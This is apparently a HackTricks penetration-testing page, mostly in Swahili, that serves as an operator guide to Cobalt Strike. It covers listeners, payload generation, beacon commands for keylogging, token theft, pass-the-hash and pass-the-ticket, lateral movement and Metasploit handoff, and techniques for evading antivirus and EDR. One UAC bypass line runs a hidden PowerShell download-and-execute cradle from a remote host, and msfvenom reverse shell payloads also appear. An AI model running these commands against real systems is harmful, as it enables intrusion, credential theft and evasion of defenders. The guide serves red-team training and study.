# Cobalt Strike

{{#include ../banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` kisha unaweza kuchagua mahali pa kusikiliza, aina ya beacon ya kutumia (http, dns, smb...) na mengineyo.

### Peer2Peer Listeners

Beacons za listeners hizi hazihitaji kuwasiliana moja kwa moja na C2; zinaweza kuwasiliana nayo kupitia beacons nyingine.

`Cobalt Strike -> Listeners -> Add/Edit` kisha unahitaji kuchagua beacons za TCP au SMB

* **Beacon ya TCP itaweka listener kwenye port iliyochaguliwa**. Ili kuunganisha kwenye beacon ya TCP, tumia amri `connect <ip> <port>` kutoka kwenye beacon nyingine
* **Beacon ya smb itasikiliza kwenye pipename yenye jina lililochaguliwa**. Ili kuunganisha kwenye beacon ya SMB, tumia amri `link [target] [pipe]`.

### Tengeneza na Host payloads

#### Tengeneza payloads kwenye faili

`Attacks -> Packages ->`

* **`HTMLApplication`** kwa faili za HTA
* **`MS Office Macro`** kwa hati ya Office yenye macro
* **`Windows Executable`** kwa .exe, .dll au service .exe
* **`Windows Executable (S)`** kwa .exe, .dll au service .exe ya **stageless** (stageless ni bora kuliko staged, IoCs ni chache)

#### Tengeneza na Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Hii itatengeneza script/executable ya kupakua beacon kutoka Cobalt Strike katika miundo kama vile: bitsadmin, exe, powershell na python

#### Host payloads

Ikiwa tayari una faili unayotaka ku-host kwenye web server, nenda tu kwenye `Attacks -> Web Drive-by -> Host File` kisha uchague faili ya ku-host na usanidi wa web server.

### Chaguo za Beacon

<details>
<summary>Chaguo na amri za Beacon</summary>

```bash
# Execute local .NET binary
execute-assembly </path/to/executable.exe>
# Note that to load assemblies larger than 1MB, the 'tasks_max_size' property of the malleable profile needs to be modified.

# Screenshots
printscreen    # Take a single screenshot via PrintScr method
screenshot     # Take a single screenshot
screenwatch    # Take periodic screenshots of desktop
## Go to View -> Screenshots to see them

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes to see the keys pressed

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inject portscan action inside another process
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Import Powershell module
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <just write powershell cmd here> # Uses the highest supported PowerShell version (not OPSEC-friendly)
powerpick <cmdlet> <args> # This creates a sacrificial process specified by spawnto, and injects UnmanagedPowerShell into it for better opsec (not logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # This injects UnmanagedPowerShell into the specified process to run the PowerShell cmdlet.


# User impersonation
## Token generation with creds
make_token [DOMAIN\user] [password] #Create token to impersonate a user in the network
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token generated with make_token
## The use of make_token generates event 4624: An account was successfully logged on.  This event is very common in a Windows domain, but can be narrowed down by filtering on the Logon Type.  As mentioned above, it uses LOGON32_LOGON_NEW_CREDENTIALS which is type 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Steal token from pid
## Like make_token but stealing the token from a process
steal_token [pid] # Also, this is useful for network actions, not local actions
## From the API documentation we know that this logon type "allows the caller to clone its current token". This is why the Beacon output says Impersonated <current_username> - it's impersonating our own cloned token.
ls \\computer_name\c$ # Try to use generated token to access C$ in a computer
rev2self # Stop using token from steal_token

## Launch process with nwe credentials
spawnas [domain\username] [password] [listener] #Do it from a directory with read access like: cd C:\
## Like make_token, this will generate Windows event 4624: An account was successfully logged on but with a logon type of 2 (LOGON32_LOGON_INTERACTIVE).  It will detail the calling user (TargetUserName) and the impersonated user (TargetOutboundUserName).

## Inject into process
inject [pid] [x64|x86] [listener]
## From an OpSec point of view: Don't perform cross-platform injection unless you really have to (e.g. x86 -> x64 or x64 -> x86).

## Pass the hash
## This modification process requires patching of LSASS memory which is a high-risk action, requires local admin privileges and not all that viable if Protected Process Light (PPL) is enabled.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash through mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Without /run, Mimikatz spawns cmd.exe; an interactive desktop user may see the shell (SYSTEM sessions are not normally visible)
steal_token <pid> #Steal token from process created by mimikatz

## Pass the ticket
## Request a ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Create a new logon session to use with the new ticket (to not overwrite the compromised one)
make_token <domain>\<username> DummyPass
## Write the ticket on the attacker machine from a PowerShell session and load it
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket from SYSTEM
## Generate a new process with the ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Steal the token from that process
steal_token <pid>

## Extract ticket + Pass the ticket
### List tickets
execute-assembly C:\path\Rubeus.exe triage
### Dump an interesting ticket by LUID
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Create new logon session, note luid and processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Insert ticket in generate logon session
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Finally, steal the token from that new process
steal_token <pid>

# Lateral Movement
## If a token was created it will be used
jump [method] [target] [listener]
## Methods:
## psexec                    x86   Use a service to run a Service EXE artifact
## psexec64                  x64   Use a service to run a Service EXE artifact
## psexec_psh                x86   Use a service to run a PowerShell one-liner
## winrm                     x86   Run a PowerShell script via WinRM
## winrm64                   x64   Run a PowerShell script via WinRM
## wmi_msbuild               x64   WMI lateral movement with an MSBuild inline C# task (OPSEC)


remote-exec [method] [target] [command] # remote-exec doesn't return output
## Methods:
## psexec                          Remote execute via Service Control Manager
## winrm                           Remote execute via WinRM (PowerShell)
## wmi                             Remote execute via WMI

## To execute a beacon with wmi (it isn't in the jump command) just upload the beacon and execute it
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## On the Metasploit host
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## On cobalt: Listeners > Add and set the Payload to Foreign HTTP. Set the Host to 10.10.5.120, the Port to 8080 and click Save.
beacon> spawn metasploit
## You can only spawn x86 Meterpreter sessions with the foreign listener.

# Pass session to Metasploit - Through shellcode injection
## On metasploit host
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Run msfvenom and prepare the multi/handler listener

## Copy bin file to cobalt strike host
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inject metasploit shellcode in a x64 process

# Pass metasploit session to cobalt strike
## Generate stageless Beacon shellcode: go to Attacks > Packages > Windows Executable (S), select the listener, choose Raw output, and enable the x64 payload.
## Use post/windows/manage/shellcode_inject in metasploit to inject the generated cobalt srike shellcode


# Pivoting
## Open a socks proxy in the teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password
```

</details>

### Custom implants / Linux Beacons

- Agent maalum inahitaji tu kuwasiliana kwa kutumia itifaki ya HTTP/S ya Cobalt Strike Team Server (default malleable C2 profile) ili kujisajili/kuwasiliana na kupokea kazi. Tekeleza URIs/headers/metadata crypto sawa na zile zilizofafanuliwa kwenye profile ili kutumia tena Cobalt Strike UI kwa kutuma kazi na kupata matokeo.<sup>[[1]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>
- Aggressor Script (kwa mfano, `CustomBeacon.cna`) inaweza kufunika utengenezaji wa payload kwa beacon isiyo ya Windows, ili waendeshaji waweze kuchagua listener na kutengeneza payload za ELF moja kwa moja kupitia GUI.
- Mifano ya Linux task handlers zinazopatikana kwenye Team Server: `sleep`, `cd`, `pwd`, `shell` (kutekeleza amri zozote), `ls`, `upload`, `download`, na `exit`. Hizi huunganishwa na task IDs zinazotarajiwa na Team Server, na lazima zitekelezwe upande wa server ili kurudisha matokeo katika muundo unaofaa.
- Usaidizi wa BOF kwenye Linux unaweza kuongezwa kwa kupakia Beacon Object Files ndani ya mchakato kwa kutumia [ELFLoader ya TrustedSec](https://github.com/trustedsec/ELFLoader) (inasaidia pia BOFs za mtindo wa Outflank), hivyo kuruhusu post-exploitation ya moduli kufanya kazi ndani ya muktadha/ruhusa za implant bila kuanzisha michakato mipya.<sup>[[2]](#references)[[3]](#references)</sup>
  Kwa tahadhari kuhusu muundo wa loader wa Linux na mipaka ya michakato, pamoja na mfano tofauti wa BOF tasking, tazama [Miundo ya Linux BOF loader na mipaka ya michakato](../linux-hardening/post-exploitation/linux-fileless-execution.md#linux-bof-loader-formats-and-process-boundaries).
- Weka SOCKS handler ndani ya beacon maalum ili kudumisha uwezo sawa wa pivoting na Windows Beacons: operator anapoendesha `socks <port>`, implant inapaswa kufungua proxy ya ndani ili kuelekeza zana za operator kupitia host ya Linux iliyoathiriwa hadi kwenye mitandao ya ndani.

## Opsec

### Execute-Assembly

**`execute-assembly`** hutumia **sacrificial process** kutekeleza programu iliyoainishwa kwa kutumia remote process injection. Hii huacha athari nyingi, kwa kuwa kuingiza ndani ya mchakato hutumia Win APIs fulani ambazo kila EDR hukagua. Hata hivyo, kuna zana maalum zinazoweza kutumika kupakia kitu ndani ya mchakato huohuo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- Katika Cobalt Strike unaweza pia kutumia BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)

Aggressor script `https://github.com/outflanknl/HelpColor` huunda amri ya `helpx` katika Cobalt Strike, ambayo huweka rangi kwenye amri kuonyesha kama ni BOFs (kijani), Frok&Run (njano) au aina nyingine zinazofanana, au kama ni ProcessExecution, injection au aina nyingine zinazofanana (nyekundu). Hii husaidia kujua amri zipi zina uwezekano mkubwa wa kufanya kazi kwa siri.

### Post-execution ya kisasa ndani ya mchakato

Matoleo ya hivi karibuni yanaongeza mbinu mbili mbadala pale ambapo classic COFF BOF ina vikwazo vingi:

- **Beacon Interpreter** hukompaili C kwenye Team Server kuwa bytecode ya kati na kuitekeleza kwenye VM iliyopachikwa ndani ya Beacon. Bytecode hubaki kuwa data badala ya native executable code, hivyo huepusha allocation ya ziada ya executable na mabadiliko ya ruhusa kutoka RW hadi RX ambayo kwa kawaida huhitajika kupakia BOF. Scripts zinaweza kuingiza Beacon API na kutangaza prototypes za Dynamic Function Resolution (DFR) za mtindo wa BOF.
- **BOF-PE** hupakia EXE au DLL kamili ndani ya Beacon ya sasa. Muundo huu unaunga mkono PE imports za kawaida, exception handling, C++ yenye uwezo zaidi na external libraries huku ukihifadhi Beacon API. Ni mzito zaidi kuliko COFF BOF ndogo, kwa hiyo uchague tu pale ambapo runtime ya ziada ina manufaa.

```bash
# Compile a C script on the Team Server and execute its bytecode
beacon-interpreter /path/to/script.c

# Execute a BOF-PE in the current Beacon
inline-execute-pe /path/to/tool.x64.exe
```

Mbinu hizi hupunguza ishara zinazohusiana na loader, lakini si telemetry inayotokana na vitendo vya script au miito ya Windows API.<sup>[[8]](#references)</sup>

### Tenda kama mtumiaji

Unaweza kuangalia matukio kama `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`: 

- Security EID 4624 - Kagua logoni zote za mwingiliano ili kujua saa za kawaida za kazi.
- System EID 12,13 - Kagua mara ambazo mfumo huzima, huwasha au huingia usingizini.
- Security EID 4624/4625 - Kagua majaribio ya NTLM yanayoingia, halali au batili.
- Security EID 4648 - Tukio hili hutengenezwa wakati credentials zilizo wazi zinapotumiwa kuingia. Ikiwa mchakato ulilitoa, huenda binary ina credentials hizo katika maandishi wazi ndani ya faili ya usanidi au kwenye code.

Unapotumia `jump` kutoka cobalt strike, ni bora kutumia mbinu ya `wmi_msbuild` ili kufanya mchakato mpya uonekane halali zaidi.

### Tumia akaunti za kompyuta

Ni kawaida kwa watetezi kukagua tabia zisizo za kawaida zinazotokana na watumiaji na **kuondoa akaunti za huduma na akaunti za kompyuta kama `*$` kwenye ufuatiliaji wao**. Unaweza kutumia akaunti hizi kutekeleza lateral movement au privilege escalation.

### Tumia payloads zisizo na hatua

Payloads zisizo na hatua hazina kelele nyingi kama zile zenye hatua kwa sababu hazihitaji kupakua hatua ya pili kutoka kwa seva ya C2. Hii inamaanisha kuwa hazizalishi trafiki ya mtandao baada ya muunganisho wa awali, hivyo zina uwezekano mdogo wa kutambuliwa na ulinzi unaotegemea mtandao.

### Tokens na Token Store

Kuwa mwangalifu unapoiba au kutengeneza tokens kwa sababu EDR inaweza kuorodhesha thread tokens na kugundua **token ya mtumiaji tofauti** au hata SYSTEM ndani ya mchakato.

Hii hukuwezesha kuhifadhi tokens **kwa kila beacon**, hivyo hakuna haja ya kuiba token ileile mara kwa mara. Hii ni muhimu kwa lateral movement au unapohitaji kutumia token iliyoibwa mara nyingi:

- `token-store steal <pid>`
- `token-store steal-and-use <pid>`
- token-store show
- `token-store use <id>`
- `token-store remove <id>`
- token-store remove-all

Unapohamia kwenye mifumo mingine, kwa kawaida ni bora **kuiba token badala ya kutengeneza mpya** au kutekeleza shambulio la pass the hash.

### Guardrails

Cobalt Strike ina kipengele kinachoitwa **Guardrails** kinachosaidia kuzuia matumizi ya amri au vitendo fulani ambavyo vinaweza kutambuliwa na watetezi. Guardrails zinaweza kusanidiwa kuzuia amri mahususi kama `make_token`, `jump`, `remote-exec` na nyingine zinazotumiwa mara nyingi kwa lateral movement au privilege escalation.

Zaidi ya hayo, repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) pia ina baadhi ya ukaguzi na mawazo unayoweza kuzingatia kabla ya kutekeleza payload.

### Usimbaji fiche wa tiketi

Katika AD, kuwa mwangalifu kuhusu usimbaji fiche wa tiketi. Kwa chaguo-msingi, baadhi ya zana hutumia usimbaji fiche wa RC4 kwa tiketi za Kerberos, ambao si salama kama usimbaji fiche wa AES; mazingira yaliyosasishwa hutumia AES kwa chaguo-msingi. Watetezi wanaofuatilia algoriti dhaifu za usimbaji fiche wanaweza kugundua hili.

### Epuka mipangilio chaguomsingi

Unapotumia Cobalt Stricke, kwa chaguo-msingi SMB pipes huwa na majina `msagent_####` na `"status_####`. Badilisha majina hayo. Unaweza kuangalia majina ya pipes zilizopo kutoka Cobal Strike kwa amri: `ls \\.\pipe\`

Zaidi ya hayo, kwenye vipindi vya SSH hutengenezwa pipe inayoitwa `\\.\pipe\postex_ssh_####`. Ibadilishe kwa kutumia `set ssh_pipename "<new_name>";`.

Pia, katika shambulio la poext exploitation, pipes `\\.\pipe\postex_####` zinaweza kubadilishwa kwa kutumia `set pipename "<new_name>"`.

Katika profiles za Cobalt Strike unaweza pia kubadilisha mambo kama:

- Kuepuka kutumia `rwx`
- Jinsi tabia ya process injection inavyofanya kazi (ni APIs zipi zitatumika) katika block ya `process-inject {...}`
- Jinsi "fork and run" inavyofanya kazi katika block ya `post-ex {…}`
- Muda wa sleep
- Ukubwa wa juu wa binaries zitakazopakiwa kwenye memory
- Memory footprint na maudhui ya DLL kwa block ya `stage {...}`
- Trafiki ya mtandao

### Sleepmask na BeaconGate

Sleepmask hubadilisha Beacon na heap allocations zake zinazofuatiliwa wakati haifanyi kazi, kisha huzirejesha ili kutekeleza kazi. Matoleo ya sasa yana mipangilio chaguomsingi inayokwepa kutambuliwa, lakini Sleepmask BOFs maalum bado zina manufaa pale ambapo mahitaji ya memory layout, allocation au call stack ni tofauti. Kuanzia toleo la 4.13, Sleepmask chaguomsingi pia hudanganya anwani ya kurudi kwa APIs zinazopitishwa kupitia BeaconGate.<sup>[[8]](#references)</sup>

**BeaconGate** hupanua muundo huu zaidi ya `Sleep`: miito teule ya WinAPI huwakilishwa kama miundo ya `FUNCTION_CALL` na kuelekezwa kwa Sleepmask BOF, inayoweza kuficha Beacon wakati wa kutekeleza miito hiyo. Profile inaweza kuelekeza kundi zima (`Comms`, `Core`, `Cleanup` au `All`) au APIs mahususi pekee:<sup>[[9]](#references)</sup>

```text
stage {
    set sleep_mask "true";
    set syscall_method "Indirect";

    beacon_gate {
        VirtualAlloc;       # Routed through BeaconGate
        VirtualAllocEx;
        InternetConnectA;
    }
}
```

For API iliyoorodheshwa chini ya `beacon_gate`, gate ina kipaumbele kuliko `syscall_method`; API ambazo hazijaorodheshwa bado zinaweza kutumia syscall method iliyosanidiwa. `beacon_gate disable` na `beacon_gate enable` huwasha au kuzima kipengele wakati programu inaendelea. Epuka kuwasha `All` bila kufikiria: amri kama `ps` huita `OpenProcess`/`CloseHandle` mara kwa mara, na zinaweza kusababisha ongezeko kubwa la matumizi ya CPU wakati kila mwito unaficha na kufichua Beacon. Sleepmask-VS hutoa hali ya Beacon/Sleepmask iliyoundwa kwa ajili ya debugging ya gates maalum bila kuzifanyia majaribio kupitia implant inayotumika mara kwa mara.<sup>[[9]](#references)</sup>

### Noisy proc injections

Kuingiza code kwenye mchakato kwa kawaida husababisha kelele nyingi, kwa sababu **kwa kawaida hakuna mchakato wa kawaida unaotekeleza kitendo hiki, na njia za kufanya hivyo ni chache sana**. Kwa hiyo, huenda kugunduliwa na mifumo ya utambuzi inayotegemea tabia. Zaidi ya hayo, EDR zinaweza kugundua hili kwa kuchanganua mtandao kutafuta **threads zenye code ambayo haipo kwenye diski** (ingawa hili hutokea mara nyingi katika michakato kama browsers zinazotumia JIT). Mfano: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | uhusiano wa PID na PPID

Unapozindua mchakato mpya, ni muhimu **kudumisha uhusiano wa kawaida wa mzazi na mtoto** kati ya michakato ili kuepuka kugunduliwa. Ikiwa svchost.exe itaendesha iexplorer.exe, hilo litaonekana kuwa la kutiliwa shaka, kwa kuwa svchost.exe si mzazi wa iexplorer.exe katika mazingira ya kawaida ya Windows.

Beacon mpya inapozinduliwa katika Cobalt Strike, kwa chaguomsingi mchakato unaotumia **`rundll32.exe`** huundwa ili kuendesha listener mpya. Hii si fiche sana na EDR zinaweza kuigundua kwa urahisi. Zaidi ya hayo, `rundll32.exe` huendeshwa bila args zozote, jambo linaloifanya ionekane ya kutiliwa shaka zaidi.

Kwa amri ifuatayo ya Cobalt Strike, unaweza kubainisha mchakato tofauti wa kuzindua beacon mpya, na kuifanya iwe vigumu zaidi kugunduliwa:

```bash
spawnto x86 svchost.exe
```

Unaweza pia kubadilisha mipangilio hii **`spawnto_x86` na `spawnto_x64`** kwenye profile.

### Kupitisha traffic ya washambuliaji kupitia proxy

Wakati mwingine washambuliaji huhitaji kuweza kutumia tools ndani ya mashine zao, hata kwenye mashine za Linux, na kuelekeza traffic ya victims kwenye tool hiyo (kwa mfano, NTLM relay).

Zaidi ya hayo, wakati mwingine, ili kufanya shambulio la pass-the.hash au pass-the-ticket, ni siri zaidi kwa mshambuliaji **kuongeza hash au ticket hiyo kwenye mchakato wake wa LSASS wa ndani** kisha kufanya pivot kutoka hapo, badala ya kurekebisha mchakato wa LSASS kwenye mashine ya victim.

Hata hivyo, unahitaji kuwa **mwangalifu na traffic inayozalishwa**, kwani huenda ukatuma traffic isiyo ya kawaida (Kerberos?) kutoka kwenye mchakato wa backdoor. Kwa hili, unaweza kufanya pivot kwenda kwenye mchakato wa browser (ingawa unaweza kugundulika unapojidunga kwenye mchakato, kwa hivyo fikiria njia ya kufanya hivyo kwa siri).


### Kuepuka AVs

#### AV/AMSI/ETW Bypass

Angalia ukurasa:


{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Kwa kawaida, kwenye `/opt/cobaltstrike/artifact-kit` unaweza kupata code na templates zilizokompailiwa mapema (kwenye `/src-common`) za payloads ambazo Cobalt Strike itatumia kutengeneza binary beacons.

Ukitumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) na backdoor iliyotengenezwa (au template iliyokompailiwa tu), unaweza kubaini ni nini kinachosababisha Defender kutoa tahadhari. Kwa kawaida huwa ni string. Kwa hiyo, unaweza kurekebisha code inayotengeneza backdoor ili string hiyo isionekane kwenye binary ya mwisho.

Baada ya kurekebisha code, endesha tu `./build.sh` kutoka kwenye directory hiyo hiyo, kisha nakili folda ya `dist-pipe/` kwenye Windows client katika `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Usisahau kupakia script kali `dist-pipe\artifact.cna` ili kuiambia Cobalt Strike itumie resources kutoka kwenye disk tunazotaka, badala ya zile zilizopakiwa.

#### Resource Kit

Folda ya ResourceKit ina templates za payloads za Cobalt Strike zinazotegemea scripts, zikiwemo PowerShell, VBA na HTA.

Kwa kutumia [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) pamoja na templates, unaweza kubaini ni nini ambacho Defender (AMSI katika hali hii) haipendi na kukirekebisha:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Kubadilisha mistari iliyotambuliwa kunaweza kutengeneza template ambayo haitagunduliwa.

Usisahau kupakia script kali `ResourceKit\resources.cna` ili kuielekeza Cobalt Strike kutumia resources kutoka kwenye diski tunazotaka, badala ya zile zilizopakiwa.

#### Function hooks | Syscall

Function hooking ni njia ya kawaida sana inayotumiwa na ERDs kugundua shughuli hasidi. Cobalt Strike hukuruhusu kukwepa hooks hizi kwa kutumia **syscalls** badala ya miito ya kawaida ya Windows API kwa kutumia usanidi wa **`None`**, au kutumia toleo la `Nt*` la function kwa mpangilio wa **`Direct`**, au kuruka tu function ya `Nt*` kwa kutumia chaguo la **`Indirect`** kwenye malleable profile. Kulingana na mfumo, chaguo moja linaweza kuwa fiche zaidi kuliko jingine.

Hili linaweza kuwekwa kwenye profile au kwa kutumia amri ya **`syscall-method`**.

Hata hivyo, hili pia linaweza kuwa na kelele nyingi.

Chaguo mojawapo linalotolewa na Cobalt Strike la kukwepa function hooks ni kuondoa hooks hizo kwa kutumia: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

Unaweza pia kuangalia ni functions zipi zilizo na hooks kwa kutumia [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) au [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




<details>
<summary>Amri mbalimbali za Cobalt Strike</summary>

```bash
cd C:\Tools\neo4j\bin
neo4j.bat console
http://localhost:7474/ --> Change password
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL



# Change powershell
C:\Tools\cobaltstrike\ResourceKit
template.x64.ps1
# Change $var_code -> $polop
# $x --> $ar
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna

#artifact kit
cd  C:\Tools\cobaltstrike\ArtifactKit
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .


```

</details>



## References

- [1] [Beacon ya Linux ya Cobalt Strike (PoC ya implant maalum)](https://github.com/EricEsquivel/CobaltStrike-Linux-Beacon)
- [2] [TrustedSec ELFLoader & Linux BOFs](https://github.com/trustedsec/ELFLoader)
- [3] [Kiolezo cha Outflank nix BOF](https://github.com/outflanknl/nix_bof_template)
- [4] [Uchambuzi wa Unit42 kuhusu usimbaji fiche wa metadata ya Cobalt Strike](https://unit42.paloaltonetworks.com/cobalt-strike-metadata-encryption-decryption/)
- [5] [Shajara ya SANS ISC kuhusu trafiki ya Cobalt Strike](https://isc.sans.edu/diary/27968)
- [6] [cs-decrypt-metadata-py](https://blog.didierstevens.com/2021/10/22/new-tool-cs-decrypt-metadata-py/)
- [7] [SentinelOne CobaltStrikeParser](https://github.com/Sentinel-One/CobaltStrikeParser)
- [8] [Cobalt Strike 4.13: Imepotea Katika Tafsiri](https://www.cobaltstrike.com/blog/cobalt-strike-413-lost-in-translation)
- [9] [Cobalt Strike 4.10: Kupitia BeaconGate](https://www.cobaltstrike.com/blog/cobalt-strike-410-through-the-beacongate?p=6046)
{{#include ../banners/hacktricks-training.md}}
